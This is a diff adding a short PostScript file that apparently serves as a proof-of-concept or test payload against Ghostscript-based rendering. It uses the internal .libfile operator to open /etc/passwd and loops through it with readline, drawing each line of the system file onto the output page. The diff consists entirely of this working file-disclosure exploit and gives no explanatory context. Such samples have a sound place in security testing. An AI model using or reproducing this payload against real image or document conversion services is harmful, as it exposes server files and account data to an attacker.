@@ -1,0 +1,15 @@
+%!PS
+/Size 20 def
+/Line 0 def
+/Buf 1024 string def
+/Path 0 newpath def
+/Courier-Bold findfont Size scalefont setfont
+1 1 1 setrgbcolor clippath fill
+0 0 0 setrgbcolor
+(/etc/passwd) .libfile {
+    {
+        dup Buf readline
+        { Path Line moveto show } { showpage quit } ifelse
+        /Line Line Size add def
+    } loop
+} if
